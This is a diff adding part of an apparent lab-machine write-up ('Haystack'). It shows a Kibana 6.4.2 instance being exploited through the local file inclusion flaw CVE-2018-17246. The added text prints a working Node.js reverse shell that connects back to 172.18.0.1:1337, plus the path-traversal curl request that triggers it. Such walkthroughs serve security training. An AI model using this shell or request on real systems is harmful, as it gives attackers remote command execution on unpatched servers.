@@ -175,3 +175,32 @@ ssh -L 5601:127.0.0.1:5601 security@10.10.10.115 -N
 ![placeholder](https://inar1.github.io/public/images/2019-11-05/heystack-badge.png)
 
 By clicking the "Management" tab, we can figure out that the version of Kibana is "6.4.2"
+![placeholder](https://inar1.github.io/public/images/2019-11-05/heystack-badge.png)
+
+By quick search, we can find that this version of kibana has a <a href="https://github.com/mpgn/CVE-2018-17246">LFI "CVE-2018-17246"</a><br>
+As it's written, upload followin javascript shell to "/dev/shm"<br>
+shell.js:
+{% highlight js %}
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1337, "172.18.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+{% endhighlight %}
+
+Then, launch a netcat listener and send a get request to access to the "shell.js".<br>
+We can achieve a reverse shell.
+{% highlight shell %}
+[security@haystack shm]$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js'
+{% endhighlight %}
+{% highlight shell %}
+
+{% endhighlihgt %}
+{%%}
